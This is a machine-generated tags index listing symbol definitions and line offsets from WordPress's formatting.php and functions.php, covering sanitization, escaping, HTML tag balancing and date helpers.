	$unicode = '';unicode558,21659
	$values = array();values559,21675
	$num_octets = 1;num_octets560,21695
	$unicode_length = 0;unicode_length561,21713
	$string_length = strlen( $utf8_string );string_length563,21736
		$value = ord( $utf8_string[ $i ] );value566,21823
			if ( count( $values ) == 0 ) $num_octets = ( $value < 224 ) ? 2 : 3;num_octets574,22010
				$values = array();values589,22502
				$num_octets = 1;num_octets590,22525
function remove_accents($string) {remove_accents608,22877
		$chars = array(chars613,23005
		$string = strtr($string, $chars);string775,32018
		$string = strtr($string, $chars['in'], $chars['out']);string791,32828
		$string = str_replace($double_chars['in'], $double_chars['out'], $string);string794,33092
function sanitize_file_name( $filename ) {sanitize_file_name814,33694
	$filename_raw = $filename;filename_raw815,33737
	$special_chars = array("?", "[", "]", "/", "\\", "=", "<", ">", ":", ";", ",", "'", "\"", "&", "$", "#", "*", "(", ")", "|", "~", "`", "!", "{", "}", chr(0));special_chars816,33765
	$special_chars = apply_filters('sanitize_file_name_chars', $special_chars, $filename_raw);special_chars817,33925
	$filename = str_replace($special_chars, '', $filename);filename818,34017
	$filename = preg_replace('/[\s-]+/', '-', $filename);filename819,34074
	$filename = trim($filename, '.-_');filename820,34129
	$parts = explode('.', $filename);parts823,34219
	$filename = array_shift($parts);filename830,34420
	$extension = array_pop($parts);extension831,34454
	$mimes = get_allowed_mime_types();mimes832,34487
			$allowed = false;allowed840,34809
			foreach ( $mimes as $ext_preg => $mime_match ) {ext_preg841,34830
				$ext_preg = '!^(' . $ext_preg . ')$!i';ext_preg842,34882
					$allowed = true;allowed844,34970
function sanitize_user( $username, $strict = false ) {sanitize_user873,35857
function sanitize_user( $username, $strict = false ) {strict873,35857
	$raw_username = $username;raw_username874,35912
	$username = wp_strip_all_tags( $username );username875,35940
	$username = remove_accents( $username );username876,35985
	$username = preg_replace( '|%([a-fA-F0-9][a-fA-F0-9])|', '', $username );username878,36043
	$username = preg_replace( '/&.+?;/', '', $username ); // Kill entitiesusername879,36118
		$username = preg_replace( '|[^a-z0-9 _.\-@]|i', '', $username );username883,36259
	$username = trim( $username );username885,36327
	$username = preg_replace( '|\s+|', ' ', $username );username887,36397
function sanitize_key( $key ) {sanitize_key902,36769
	$raw_key = $key;raw_key903,36801
	$key = strtolower( $key );key904,36819
	$key = preg_replace( '/[^a-z0-9_\-]/', '', $key );key905,36847
function sanitize_title($title, $fallback_title = '', $context = 'save') {sanitize_title923,37464
function sanitize_title($title, $fallback_title = '', $context = 'save') {fallback_title923,37464
	$raw_title = $title;raw_title924,37539
		$title = remove_accents($title);title927,37589
	$title = apply_filters('sanitize_title', $title, $raw_title, $context);title929,37625
		$title = $fallback_title;title932,37741
function sanitize_title_for_query($title) {sanitize_title_for_query937,37789
function sanitize_title_with_dashes($title, $raw_title = '', $context = 'display') {sanitize_title_with_dashes954,38326
function sanitize_title_with_dashes($title, $raw_title = '', $context = 'display') {raw_title954,38326
	$title = strip_tags($title);title955,38411
	$title = preg_replace('|%([a-fA-F0-9][a-fA-F0-9])|', '---$1---', $title);title957,38470
	$title = str_replace('%', '', $title);title959,38601
	$title = preg_replace('|---([a-fA-F0-9][a-fA-F0-9])---|', '%$1', $title);title961,38661
			$title = mb_strtolower($title, 'UTF-8');title965,38806
		$title = utf8_uri_encode($title, 200);title967,38854
	$title = strtolower($title);title970,38899
	$title = preg_replace('/&.+?;/', '', $title); // kill entitiestitle971,38929
	$title = str_replace('.', '-', $title);title972,38993
		$title = str_replace( array( '%c2%a0', '%e2%80%93', '%e2%80%94' ), '-', $title );title976,39110
		$title = str_replace( array(title979,39232
		$title = str_replace( '%c3%97', 'x', $title );title992,39648
	$title = preg_replace('/[^%a-z0-9 _-]/', '', $title);title995,39701
	$title = preg_replace('/\s+/', '-', $title);title996,39756
	$title = preg_replace('|-+|', '-', $title);title997,39802
	$title = trim($title, '-');title998,39847
function sanitize_sql_orderby( $orderby ){sanitize_sql_orderby1014,40211
 * @todo Expand to support the full range of CDATA that a class attribute can contain.attribute1027,40639
function sanitize_html_class( $class, $fallback = '' ) {sanitize_html_class1036,40983
function sanitize_html_class( $class, $fallback = '' ) {fallback1036,40983
	$sanitized = preg_replace( '|%[a-fA-F0-9][a-fA-F0-9]|', '', $class );sanitized1038,41074
	$sanitized = preg_replace( '/[^A-Za-z0-9_-]/', '', $sanitized );sanitized1041,41174
		$sanitized = $fallback;sanitized1044,41266
function convert_chars($content, $deprecated = '') {convert_chars1062,41767
function convert_chars($content, $deprecated = '') {deprecated1062,41767
	$wp_htmltranswinuni = array(wp_htmltranswinuni1067,41966
	$content = preg_replace('/<title>(.+?)<\/title>/','',$content);content1103,42863
	$content = preg_replace('/<category>(.+?)<\/category>/','',$content);content1104,42928
	$content = preg_replace('/&([^#])(?![a-z1-4]{1,8};)/i', '&#038;$1', $content);content1107,43057
	$content = strtr($content, $wp_htmltranswinuni);content1110,43159
	$content = str_replace('<br>', '<br />', $content);content1113,43239
	$content = str_replace('<hr>', '<hr />', $content);content1114,43292
function balanceTags( $text, $force = false ) {balanceTags1130,43742
function balanceTags( $text, $force = false ) {force1130,43742
function force_balance_tags( $text ) {force_balance_tags1154,44402
	$tagstack = array();tagstack1155,44441
	$stacksize = 0;stacksize1156,44463
	$tagqueue = '';tagqueue1157,44480
	$newtext = '';newtext1158,44497
	$single_tags = array( 'br', 'hr', 'img', 'input' ); // Known single-entity/self-closing tagssingle_tags1159,44513
	$nestable_tags = array( 'blockquote', 'div', 'span', 'q' ); // Tags that can be immediately nested within themselvesnestable_tags1160,44607
	$text = str_replace('< !--', '<    !--', $text);text1163,44797
	$text = preg_replace('#<([0-9]{1})#', '&lt;$1', $text);text1165,44922
		$i = strpos($text, $regex[0]);i1170,45074
		$l = strlen($regex[0]);l1171,45107
		$tagqueue = '';tagqueue1174,45157
			$tag = strtolower(substr($regex[1],1));tag1177,45257
				$tag = '';tag1180,45358
				// or close to be safe $tag = '/' . $tag;tag1181,45373
				$tag = '</' . $tag . '>'; // Close Tagtag1185,45547
				for ( $j = $stacksize-1; $j >= 0; $j-- ) {j1190,45700
						for ( $k = $stacksize-1; $k >= $j; $k--) {k1193,45811
				$tag = '';tag1200,45972
			$tag = strtolower($regex[1]);tag1203,46016
			if ( substr($regex[2],-1) == '/' || $tag == '' ) {tag1208,46118
					$tagqueue = '</' . array_pop ($tagstack) . '>';tagqueue1217,46574
				$stacksize = array_push ($tagstack, $tag);stacksize1220,46652
			$attributes = $regex[2];attributes1224,46722
				$attributes = ' '.$attributes;attributes1226,46779
			$tag = '<' . $tag . $attributes . '>';tag1228,46815
				$tag = '';tag1232,46973
		$text = substr($text, $i + $l);text1236,47040
	while( $x = array_pop($tagstack) )x1246,47183
	$newtext = str_replace("< !--","<!--",$newtext);newtext1250,47324
	$newtext = str_replace("<    !--","< !--",$newtext);newtext1251,47374
function format_to_edit( $content, $richedit = false ) {format_to_edit1269,48022
function format_to_edit( $content, $richedit = false ) {richedit1269,48022
	$content = apply_filters( 'format_to_edit', $content );content1270,48079
		$content = esc_textarea( $content );content1272,48156
function format_to_post($content) {format_to_post1284,48417
	$content = apply_filters('format_to_post', $content);content1285,48453
function zeroise($number, $threshold) {zeroise1306,49184
function backslashit($string) {backslashit1318,49503
	$string = preg_replace('/^([0-9])/', '\\\\\\\\\1', $string);string1319,49535
	$string = preg_replace('/([a-z])/i', '\\\\\1', $string);string1320,49597
function trailingslashit($string) {trailingslashit1339,50204
function untrailingslashit($string) {untrailingslashit1354,50621
function addslashes_gpc($gpc) {addslashes_gpc1369,51007
		$gpc = stripslashes($gpc);gpc1371,51070
 * If an array is passed, the array_map() function causes a callback to pass thecauses1379,51200
function stripslashes_deep($value) {stripslashes_deep1387,51514
		$value = array_map('stripslashes_deep', $value);value1389,51578
		$vars = get_object_vars( $value );vars1391,51663
		foreach ($vars as $key=>$data) {key1392,51700
		$value = stripslashes($value);value1396,51797
function urlencode_deep($value) {urlencode_deep1411,52105
	$value = is_array($value) ? array_map('urlencode_deep', $value) : urlencode($value);value1412,52139
function rawurlencode_deep( $value ) {rawurlencode_deep1424,52497
function antispambot($emailaddy, $mailto=0) {antispambot1437,52896
function antispambot($emailaddy, $mailto=0) {mailto1437,52896
	$emailNOSPAMaddy = '';emailNOSPAMaddy1438,52942
	for ($i = 0; $i < strlen($emailaddy); $i = $i + 1) {i1440,53006
		$j = floor(rand(0, 1+$mailto));j1441,53060
	$emailNOSPAMaddy = str_replace('@','&#64;',$emailNOSPAMaddy);emailNOSPAMaddy1450,53347
 * This function was backported from 2.5.0 to 2.3.2. Regex callback for {@linkwas1457,53498
function _make_url_clickable_cb($matches) {_make_url_clickable_cb1466,53740
	$url = $matches[2];url1467,53784
		$suffix = '';suffix1473,54089
		$suffix = $matches[3];suffix1475,54115
		$suffix = strrchr( $url, ')' ) . $suffix;suffix1480,54261
		$url = substr( $url, 0, strrpos( $url, ')' ) );url1481,54305
	$url = esc_url($url);url1484,54359
 * This function was backported from 2.5.0 to 2.3.2. Regex callback for {@linkwas1494,54565
function _make_web_ftp_clickable_cb($matches) {_make_web_ftp_clickable_cb1503,54807
	$ret = '';ret1504,54855
	$dest = $matches[2];dest1505,54867
	$dest = 'http://' . $dest;dest1506,54889
	$dest = esc_url($dest);dest1507,54917
		$ret = substr($dest, -1);ret1513,55105
		$dest = substr($dest, 0, strlen($dest)-1);dest1514,55133
 * This function was backported from 2.5.0 to 2.3.2. Regex callback for {@linkwas1522,55327
function _make_email_clickable_cb($matches) {_make_email_clickable_cb1531,55571
	$email = $matches[2] . '@' . $matches[3];email1532,55617
function make_clickable( $text ) {make_clickable1547,55985
	$r = '';r1548,56020
	$textarr = preg_split( '/(<[^<>]+>)/', $text, -1, PREG_SPLIT_DELIM_CAPTURE ); // split out HTML tagstextarr1549,56030
			$ret = " $piece "; // Pad with whitespace to simplify the regexesret1567,56712
			$url_clickable = '~url_clickable1569,56782
			$ret = preg_replace_callback( $url_clickable, '_make_url_clickable_cb', $ret );ret1584,57924
			$ret = preg_replace_callback( '#([\s>])((www|ftp)\.[\w\\x80-\\xff\#$%&~/.\-;:=,?@\[\]+]+)#is', '_make_web_ftp_clickable_cb', $ret );ret1586,58008
			$ret = preg_replace_callback( '#([\s>])([.0-9a-z_+-]+)@(([0-9a-z-]+\.)+[0-9a-z]{2,})#i', '_make_email_clickable_cb', $ret );ret1587,58144
			$ret = substr( $ret, 1, -1 ); // Remove our whitespace padding.ret1589,58273
	$r = preg_replace( '#(<a( [^>]+?>|>))<a [^>]+?>([^>]+?)</a></a>#i', "$1$3</a>", $r );r1595,58408
function _split_str_by_whitespace( $string, $goal ) {_split_str_by_whitespace1630,59953
	$chunks = array();chunks1631,60007
	$string_nullspace = strtr( $string, "\r\n\t\v\f ", "\000\000\000\000\000\000" );string_nullspace1633,60028
		$pos = strrpos( substr( $string_nullspace, 0, $goal + 1 ), "\000" );pos1636,60160
			$pos = strpos( $string_nullspace, "\000", $goal + 1 );pos1639,60258
		$string = substr( $string, $pos + 1 );string1646,60410
		$string_nullspace = substr( $string_nullspace, $pos + 1 );string_nullspace1647,60451
function wp_rel_nofollow( $text ) {wp_rel_nofollow1665,60776
	$text = stripslashes($text);text1667,60871
	$text = preg_replace_callback('|<a (.+?)>|i', 'wp_rel_nofollow_callback', $text);text1668,60901
	$text = esc_sql($text);text1669,60984
function wp_rel_nofollow_callback( $matches ) {wp_rel_nofollow_callback1684,61339
	$text = $matches[1];text1685,61387
	$text = str_replace(array(' rel="nofollow"', " rel='nofollow'"), '', $text);text1686,61409
function translate_smiley($smiley) {translate_smiley1702,61871
	$smiley = trim(reset($smiley));smiley1709,61979
	$img = $wpsmiliestrans[$smiley];img1710,62012
	$smiley_masked = esc_attr($smiley);smiley_masked1711,62046
	$srcurl = apply_filters('smilies_src', includes_url("images/smilies/$img"), $img, site_url());srcurl1713,62084
 * used in the function isn't empty.isn1722,62394
function convert_smilies($text) {convert_smilies1730,62620
	$output = '';output1732,62681
		$textarr = preg_split("/(<.*>)/U", $text, -1, PREG_SPLIT_DELIM_CAPTURE); // capture the tags as well as in betweentextarr1735,62838
		$stop = count($textarr);// loop stuffstop1736,62955
			$content = $textarr[$i];content1738,63030
				$content = preg_replace_callback($wp_smiliessearch, 'translate_smiley', $content);content1740,63136
		$output = $text;output1746,63292
function is_email( $email, $deprecated = false ) {is_email1762,63607
function is_email( $email, $deprecated = false ) {deprecated1762,63607
	$subs = explode( '.', $domain );subs1797,64763
function wp_iso_descrambler($string) {wp_iso_descrambler1830,65675
		$subject = str_replace('_', ' ', $matches[2]);subject1835,65863
		$subject = preg_replace_callback('#\=([0-9a-f]{2})#i', '_wp_iso_convert', $subject);subject1836,65912
 * Helper function to convert hex encoded chars to asciito1842,66028
function _wp_iso_convert( $match ) {_wp_iso_convert1848,66190
function get_gmt_from_date($string, $format = 'Y-m-d H:i:s') {get_gmt_from_date1867,66883
function get_gmt_from_date($string, $format = 'Y-m-d H:i:s') {format1867,66883
	$tz = get_option('timezone_string');tz1869,67061
		$datetime = new DateTime( $string );datetime1872,67149
		$offset = $datetime->getOffset();offset1874,67241
		$string_gmt = gmdate($format, $datetime->format('U'));string_gmt1876,67332
		$string_time = gmmktime($matches[4], $matches[5], $matches[6], $matches[2], $matches[3], $matches[1]);string_time1880,67436
		$string_gmt = gmdate($format, $string_time - get_option('gmt_offset') * 3600);string_gmt1881,67541
function get_date_from_gmt($string, $format = 'Y-m-d H:i:s') {get_date_from_gmt1898,68095
function get_date_from_gmt($string, $format = 'Y-m-d H:i:s') {format1898,68095
	$string_time = gmmktime($matches[4], $matches[5], $matches[6], $matches[2], $matches[3], $matches[1]);string_time1900,68273
	$string_localtime = gmdate($format, $string_time + get_option('gmt_offset')*3600);string_localtime1901,68377
function iso8601_timezone_to_offset($timezone) {iso8601_timezone_to_offset1913,68688
		$offset = 0;offset1916,68805
		$sign    = (substr($timezone, 0, 1) == '+') ? 1 : -1;sign1918,68830
		$hours   = intval(substr($timezone, 1, 2));hours1919,68886
		$minutes = intval(substr($timezone, 3, 4)) / 60;minutes1920,68932
		$offset  = $sign * 3600 * ($hours + $minutes);offset1921,68983
function iso8601_to_datetime($date_string, $timezone = 'user') {iso8601_to_datetime1935,69454
function iso8601_to_datetime($date_string, $timezone = 'user') {timezone1935,69454
	$timezone = strtolower($timezone);timezone1936,69519
			$offset = iso8601_timezone_to_offset($date_bits[7]);offset1943,69801
			$offset = 3600 * get_option('gmt_offset');offset1945,69946
		$timestamp = gmmktime($date_bits[4], $date_bits[5], $date_bits[6], $date_bits[2], $date_bits[3], $date_bits[1]);timestamp1948,69997
function popuplinks($text) {popuplinks1970,70819
	$text = preg_replace('/<a (.+?)>/i', "<a $1 target='_blank' rel='external'>", $text);text1971,70848
function sanitize_email( $email ) {sanitize_email1983,71139
	$local = preg_replace( '/[^a-zA-Z0-9!#$%&\'*+\/=?^_`{|}~\.-]/', '', $local );local1999,71650
	$domain = preg_replace( '/\.{2,}/', '', $domain );domain2006,71886
	$domain = trim( $domain, " \t\n\r\0\x0B." );domain2012,72106
	$subs = explode( '.', $domain );subs2018,72292
	$new_subs = array();new_subs2026,72536
		$sub = trim( $sub, " \t\n\r\0\x0B-" );sub2031,72657
		$sub = preg_replace( '/[^a-z0-9-]+/i', '', $sub );sub2034,72732
	$domain = join( '.', $new_subs );domain2048,73094
	$email = $local . '@' . $domain;email2051,73162
function human_time_diff( $from, $to = '' ) {human_time_diff2069,73714
function human_time_diff( $from, $to = '' ) {to2069,73714
		$to = time();to2071,73779
	$diff = (int) abs($to - $from);diff2072,73795
		$mins = round($diff / 60);mins2074,73850
			$mins = 1;mins2076,73899
		$since = sprintf(_n('%s min', '%s mins', $mins), $mins);since2079,73949
		$hours = round($diff / 3600);hours2081,74058
			$hours = 1;hours2083,74111
		$since = sprintf(_n('%s hour', '%s hours', $hours), $hours);since2085,74130
		$days = round($diff / 86400);days2087,74222
			$days = 1;days2089,74274
		$since = sprintf(_n('%s day', '%s days', $days), $days);since2091,74292
function wp_trim_excerpt($text = '') {wp_trim_excerpt2111,74981
	$raw_excerpt = $text;raw_excerpt2112,75020
		$text = get_the_content('');text2114,75065
		$text = strip_shortcodes( $text );text2116,75097
		$text = apply_filters('the_content', $text);text2118,75135
		$text = str_replace(']]>', ']]&gt;', $text);text2119,75182
		$excerpt_length = apply_filters('excerpt_length', 55);excerpt_length2120,75229
		$excerpt_more = apply_filters('excerpt_more', ' ' . '[...]');excerpt_more2121,75286
		$text = wp_trim_words( $text, $excerpt_length, $excerpt_more );text2122,75350
 * This function is localized. For languages that count 'words' by the individualis2130,75536
function wp_trim_words( $text, $num_words = 55, $more = null ) {wp_trim_words2141,75978
function wp_trim_words( $text, $num_words = 55, $more = null ) {num_words2141,75978
		$more = __( '&hellip;' );more2143,76066
	$original_text = $text;original_text2144,76094
	$text = wp_strip_all_tags( $text );text2145,76119
		$text = trim( preg_replace( "/[\n\r\t ]+/", ' ', $text ), ' ' );text2149,76479
		$words_array = array_slice( $words_array[0], 0, $num_words + 1 );words_array2151,76595
		$sep = '';sep2152,76663
		$words_array = preg_split( "/[\n\r\t ]+/", $text, $num_words + 1, PREG_SPLIT_NO_EMPTY );words_array2154,76686
		$sep = ' ';sep2155,76777
		$text = implode( $sep, $words_array );text2159,76868
		$text = $text . $more;text2160,76909
		$text = implode( $sep, $words_array );text2162,76944
function ent2ncr($text) {ent2ncr2175,77277
	$filtered = apply_filters( 'pre_ent2ncr', null, $text );filtered2178,77367
	$to_ncr = array(to_ncr2182,77472
function wp_richedit_pre($text) {wp_richedit_pre2456,84280
	$output = convert_chars($text);output2460,84432
	$output = wpautop($output);output2461,84465
	$output = htmlspecialchars($output, ENT_NOQUOTES);output2462,84494
function wp_htmledit_pre($output) {wp_htmledit_pre2478,84887
		$output = htmlspecialchars($output, ENT_NOQUOTES); // convert only < > &output2480,84947
 * e.g. $subject = '%0%0%0DDD', $search ='%0D', $result ='' rather than the '%0%0DD' thatsubject2489,85284
function _deep_replace( $search, $subject ) {_deep_replace2499,85543
	$found = true;found2500,85589
	$subject = (string) $subject;subject2501,85605
		$found = false;found2503,85656
				$found = true;found2506,85764
				$subject = str_replace( $val, '', $subject );subject2507,85783
function esc_sql( $sql ) {esc_sql2524,86091
function esc_url( $url, $protocols = null, $_context = 'display' ) {esc_url2546,86971
function esc_url( $url, $protocols = null, $_context = 'display' ) {protocols2546,86971
	$original_url = $url;original_url2547,87040
	$url = preg_replace('|[^a-z0-9-~+_.?#=!&;,/:%@$\|*\'()\\x80-\\xff]|i', '', $url);url2551,87098
	$strip = array('%0d', '%0a', '%0D', '%0A');strip2552,87181
	$url = _deep_replace($strip, $url);url2553,87226
	$url = str_replace(';//', '://', $url);url2554,87263
		$url = 'http://' . $url;url2561,87602
		$url = wp_kses_normalize_entities( $url );url2565,87726
		$url = str_replace( '&amp;', '&#038;', $url );url2566,87771
		$url = str_replace( "'", '&#039;', $url );url2567,87820
		$protocols = wp_allowed_protocols();protocols2571,87902
function esc_url_raw( $url, $protocols = null ) {esc_url_raw2588,88315
function esc_url_raw( $url, $protocols = null ) {protocols2588,88315
function htmlentities2($myHTML) {htmlentities22602,88675
	$translation_table = get_html_translation_table( HTML_ENTITIES, ENT_QUOTES );translation_table2603,88709
function esc_js( $text ) {esc_js2620,89359
	$safe_text = wp_check_invalid_utf8( $text );safe_text2621,89386
	$safe_text = _wp_specialchars( $safe_text, ENT_COMPAT );safe_text2622,89432
	$safe_text = preg_replace( '/&#(x)?0*(?(1)27|39);?/i', "'", stripslashes( $safe_text ) );safe_text2623,89490
	$safe_text = str_replace( "\r", '', $safe_text );safe_text2624,89581
	$safe_text = str_replace( "\n", '\\n', addslashes( $safe_text ) );safe_text2625,89632
function esc_html( $text ) {esc_html2637,89860
	$safe_text = wp_check_invalid_utf8( $text );safe_text2638,89889
	$safe_text = _wp_specialchars( $safe_text, ENT_QUOTES );safe_text2639,89935
function esc_attr( $text ) {esc_attr2651,90156
	$safe_text = wp_check_invalid_utf8( $text );safe_text2652,90185
	$safe_text = _wp_specialchars( $safe_text, ENT_QUOTES );safe_text2653,90231
function esc_textarea( $text ) {esc_textarea2665,90458
	$safe_text = htmlspecialchars( $text, ENT_QUOTES );safe_text2666,90491
function tag_escape($tag_name) {tag_escape2678,90709
	$safe_tag = strtolower( preg_replace('/[^a-zA-Z0-9_:]/', '', $tag_name) );safe_tag2679,90742
function like_escape($text) {like_escape2691,91072
function wp_make_link_relative( $link ) {wp_make_link_relative2706,91477
function sanitize_option($option, $value) {sanitize_option2722,91941
			$value = sanitize_email( $value );value2727,92058
				$value = get_option( $option ); // Resets option to stored value in the case of failed sanitizationvalue2729,92129
			$value = absint( $value );value2756,93049
				$value = absint( $value );value2761,93137
			$value = (int) $value;value2766,93228
				$value = 1;value2768,93278
				$value = abs($value);value2770,93316
			if ( $value == '0' || $value == '')value2776,93500
				$value = 'closed';value2777,93539
			$value = addslashes($value);value2782,93618
			$value = wp_filter_post_kses( $value ); // calls stripslashes then addslashesvalue2783,93650
			$value = stripslashes($value);value2784,93731
			$value = esc_html( $value );value2785,93765
			$value = preg_replace('/[^a-zA-Z0-9_-]/', '', $value); // strips slashesvalue2789,93831
			$value = strip_tags($value);value2799,94083
			$value = addslashes($value);value2800,94115
			$value = wp_filter_kses($value); // calls stripslashes then addslashesvalue2801,94147
			$value = stripslashes($value);value2802,94221
			$value = preg_replace('/[^0-9:.-]/', '', $value); // strips slashesvalue2806,94287
				$value = esc_url_raw($value);value2811,94447
				$value = get_option( $option ); // Resets option to stored value in the case of failed sanitizationvalue2813,94493
				$value = esc_url_raw($value);value2821,94893
				$value = get_option( $option ); // Resets option to stored value in the case of failed sanitizationvalue2823,94939
			$allowed = get_available_languages();allowed2830,95270
				$value = get_option( $option );value2832,95373
			$allowed_zones = timezone_identifiers_list();allowed_zones2836,95446
				$value = get_option( $option ); // Resets option to stored value in the case of failed sanitizationvalue2838,95565
			$value = esc_url_raw( $value );value2847,95962
			$value = str_replace( 'http://', '', $value );value2848,95997
	$value = apply_filters("sanitize_option_{$option}", $value, $option);value2852,96061
function wp_parse_str( $string, &$array ) {wp_parse_str2869,96558
		$array = stripslashes_deep( $array );array2872,96664
	$array = apply_filters( 'wp_parse_str', $array );array2873,96704
function wp_pre_kses_less_than( $text ) {wp_pre_kses_less_than2887,97019
 * Callback function used by preg_replace.used2892,97164
function wp_pre_kses_less_than_callback( $matches ) {wp_pre_kses_less_than_callback2900,97405
function wp_sprintf( $pattern ) {wp_sprintf2916,97873
	$args = func_get_args( );args2917,97907
	$len = strlen($pattern);len2918,97934
	$start = 0;start2919,97960
	$result = '';result2920,97973
	$arg_index = 0;arg_index2921,97988
		$end = strpos($pattern, '%', $start + 1);end2937,98331
			$end = $len;end2939,98399
		$fragment = substr($pattern, $start, $end - $start);fragment2940,98415
				$arg = isset($args[$matches[1]]) ? $args[$matches[1]] : '';arg2946,98655
				$fragment = str_replace("%{$matches[1]}$", '%', $fragment);fragment2947,98719
				$arg = isset($args[$arg_index]) ? $args[$arg_index] : '';arg2950,98813
			$_fragment = apply_filters( 'wp_sprintf', $fragment, $arg );_fragment2954,98912
				$fragment = $_fragment;fragment2956,99010
				$fragment = sprintf($fragment, strval($arg) );fragment2958,99046
		$start = $end;start2963,99174
function wp_sprintf_l($pattern, $args) {wp_sprintf_l2981,99723
	$l = apply_filters('wp_sprintf_l', array(l2991,99979
	$args = (array) $args;args3000,100380
	$result = array_shift($args);result3001,100404
	$i = count($args);i3005,100552
		$arg = array_shift($args);arg3007,100588
function wp_html_excerpt( $str, $count ) {wp_html_excerpt3030,101206
	$str = wp_strip_all_tags( $str, true );str3031,101249
	$str = mb_substr( $str, 0, $count );str3032,101290
	$str = preg_replace( '/&[^;\s]{0,6}$/', '', $str );str3034,101368
function links_add_base_url( $content, $base, $attrs = array('src', 'href') ) {links_add_base_url3051,101854
function links_add_base_url( $content, $base, $attrs = array('src', 'href') ) {attrs3051,101854
	$_links_add_base = $base;_links_add_base3053,101960
	$attrs = implode('|', (array)$attrs);attrs3054,101987
function _links_add_base($m) {_links_add_base3067,102314
 * This function by default only applies to <a> tags, however this can beby3080,102692
function links_add_target( $content, $target = '_blank', $tags = array('a') ) {links_add_target3092,103109
function links_add_target( $content, $target = '_blank', $tags = array('a') ) {target3092,103109
	$_links_add_target = $target;_links_add_target3094,103217
	$tags = implode('|', (array)$tags);tags3095,103248
function _links_add_target( $m ) {_links_add_target3108,103568
	$tag = $m[1];tag3110,103631
	$link = preg_replace('|(target=[\'"](.*?)[\'"])|i', '', $m[2]);link3111,103646
function normalize_whitespace( $str ) {normalize_whitespace3116,103855
	$str  = trim($str);str3117,103895
	$str  = str_replace("\r", "\n", $str);str3118,103916
	$str  = preg_replace( array( '/\n+/', '/[ \t]+/' ), array( "\n", ' ' ), $str );str3119,103956
function wp_strip_all_tags($string, $remove_breaks = false) {wp_strip_all_tags3132,104337
function wp_strip_all_tags($string, $remove_breaks = false) {remove_breaks3132,104337
	$string = preg_replace( '@<(script|style)[^>]*?>.*?</\\1>@si', '', $string );string3133,104399
	$string = strip_tags($string);string3134,104478
		$string = preg_replace('/[\r\n\t ]+/', ' ', $string);string3137,104534
function sanitize_text_field($str) {sanitize_text_field3156,104901
	$filtered = wp_check_invalid_utf8( $str );filtered3157,104938
		$filtered = wp_pre_kses_less_than( $filtered );filtered3160,105026
		$filtered = wp_strip_all_tags( $filtered, true );filtered3162,105122
		$filtered = trim( preg_replace('/[\r\n\t ]+/', ' ', $filtered) );filtered3164,105184
	$match = array();match3167,105256
	$found = false;found3168,105275
		$filtered = str_replace($match[0], '', $filtered);filtered3170,105354
		$found = true;found3171,105407
		$filtered = trim( preg_replace('/ +/', ' ', $filtered) );filtered3176,105521
function wp_basename( $path, $suffix = '' ) {wp_basename3191,105852
function wp_basename( $path, $suffix = '' ) {suffix3191,105852
 * Violating our coding standards for a good function name.name3198,106093
function capital_P_dangit( $text ) {capital_P_dangit3202,106176
	static $dblq = false;dblq3207,106396
	static $dblq = false;dblq3207,106396
		$dblq = _x('&#8220;', 'opening curly quote');dblq3209,106443
function sanitize_mime_type( $mime_type ) {sanitize_mime_type3225,106844
	$sani_mime_type = preg_replace( '/[^-+*.a-zA-Z0-9\/]/', '', $mime_type );sani_mime_type3226,106888
function sanitize_trackback_urls( $to_ping ) {sanitize_trackback_urls3238,107321
	$urls_to_ping = preg_split( '/[\r\n\t ]/', trim( $to_ping ), -1, PREG_SPLIT_NO_EMPTY );urls_to_ping3239,107368
	foreach ( $urls_to_ping as $k => $url ) {k3240,107457
	$urls_to_ping = array_map( 'esc_url_raw', $urls_to_ping );urls_to_ping3244,107581
	$urls_to_ping = implode( "\n", $urls_to_ping );urls_to_ping3245,107641

wordpress/wp-includes/functions.php,42776
function mysql2date( $format, $date, $translate = true ) {mysql2date26,709
function mysql2date( $format, $date, $translate = true ) {translate26,709
	$i = strtotime( $date );i33,872
function current_time( $type, $gmt = 0 ) {current_time59,1638
function current_time( $type, $gmt = 0 ) {gmt59,1638
function date_i18n( $dateformatstring, $unixtimestamp = false, $gmt = false ) {date_i18n84,2506
function date_i18n( $dateformatstring, $unixtimestamp = false, $gmt = false ) {unixtimestamp84,2506
	$i = $unixtimestamp;i86,2606
			$i = current_time( 'timestamp' );i90,2668
			$i = time();i92,2712
		$gmt = true;gmt95,2811
	$req_format = $dateformatstring;req_format100,2943
	$datefunc = $gmt? 'gmdate' : 'date';datefunc102,2978
		$datemonth = $wp_locale->get_month( $datefunc( 'm', $i ) );datemonth105,3096
		$datemonth_abbrev = $wp_locale->get_month_abbrev( $datemonth );datemonth_abbrev106,3158
		$dateweekday = $wp_locale->get_weekday( $datefunc( 'w', $i ) );dateweekday107,3224
		$dateweekday_abbrev = $wp_locale->get_weekday_abbrev( $dateweekday );dateweekday_abbrev108,3290
		$datemeridiem = $wp_locale->get_meridiem( $datefunc( 'a', $i ) );datemeridiem109,3362
		$datemeridiem_capital = $wp_locale->get_meridiem( $datefunc( 'A', $i ) );datemeridiem_capital110,3430
		$dateformatstring = ' '.$dateformatstring;dateformatstring111,3506
		$dateformatstring = preg_replace( "/([^\\\])D/", "\\1" . backslashit( $dateweekday_abbrev ), $dateformatstring );dateformatstring112,3551
		$dateformatstring = preg_replace( "/([^\\\])F/", "\\1" . backslashit( $datemonth ), $dateformatstring );dateformatstring113,3667
		$dateformatstring = preg_replace( "/([^\\\])l/", "\\1" . backslashit( $dateweekday ), $dateformatstring );dateformatstring114,3774
		$dateformatstring = preg_replace( "/([^\\\])M/", "\\1" . backslashit( $datemonth_abbrev ), $dateformatstring );dateformatstring115,3883
		$dateformatstring = preg_replace( "/([^\\\])a/", "\\1" . backslashit( $datemeridiem ), $dateformatstring );dateformatstring116,3997
		$dateformatstring = preg_replace( "/([^\\\])A/", "\\1" . backslashit( $datemeridiem_capital ), $dateformatstring );dateformatstring117,4107
		$dateformatstring = substr( $dateformatstring, 1, strlen( $dateformatstring ) -1 );dateformatstring119,4226
	$timezone_formats = array( 'P', 'I', 'O', 'T', 'Z', 'e' );timezone_formats121,4315
	$timezone_formats_re = implode( '|', $timezone_formats );timezone_formats_re122,4375
		$timezone_string = get_option( 'timezone_string' );timezone_string124,4502
			$timezone_object = timezone_open( $timezone_string );timezone_object126,4584
			$date_object = date_create( null, $timezone_object );date_object127,4641
					$formatted = date_format( $date_object, $timezone_format );formatted130,4821
					$dateformatstring = ' '.$dateformatstring;dateformatstring131,4886
					$dateformatstring = preg_replace( "/([^\\\])$timezone_format/", "\\1" . backslashit( $formatted ), $dateformatstring );dateformatstring132,4934
					$dateformatstring = substr( $dateformatstring, 1, strlen( $dateformatstring ) -1 );dateformatstring133,5059
